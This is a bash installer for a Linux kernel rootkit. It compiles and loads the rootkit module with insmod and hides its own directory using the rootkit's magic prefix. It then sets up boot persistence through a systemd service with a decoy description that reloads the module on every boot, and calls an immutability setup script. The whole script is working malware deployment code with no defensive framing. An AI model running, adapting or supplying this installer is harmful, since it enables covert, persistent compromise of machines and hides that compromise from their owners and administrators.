#!/bin/bash

makeImmutable=true

make

koFile=$(ls *.ko)
hFile=$(ls *.h)
if test -f "$koFile"; then
    
    # Load the rootkit's kernel module:
    insmod "$koFile"
    echo "Loaded."

    # Hide current directory via the MAGIC_PREFIX:
    magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
    thisDirPath=$(pwd)
    thisDir=${PWD##*/}
    mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
    cd '../'"$magicPrefix""$thisDir"
    thisDirPath=$(pwd)
    echo "Hidden."

    # Boot script:
    touch boot.sh
    chmod +x boot.sh
    echo "#!/bin/bash" >> boot.sh
    echo "insmod $thisDirPath/$koFile" >> boot.sh
    bootPath="$thisDirPath/boot.sh"
    bootServicePath="/etc/systemd/system/""$magicPrefix""load.service"
    touch $bootServicePath
    echo "[Unit]" >> "$bootServicePath"
    echo "Description=Joe Mamma" >> "$bootServicePath"
    echo "After=multi-user.target" >> "$bootServicePath"
    echo "" >> "$bootServicePath"
    echo "[Service]" >> "$bootServicePath"
    echo "Type=simple" >> "$bootServicePath"
    echo "RemainAfterExit=yes" >> "$bootServicePath"
    echo "ExecStart=$bootPath" >> "$bootServicePath"
    echo "TimeoutStartSec=0" >> "$bootServicePath"
    echo "" >> "$bootServicePath"
    echo "[Install]" >> "$bootServicePath"
    echo "WantedBy=default.target" >> "$bootServicePath" 
    systemctl daemon-reload
    systemctl enable "$bootServicePath"
    echo "Boot."

    ./immSetup.sh

    echo "Built."
fi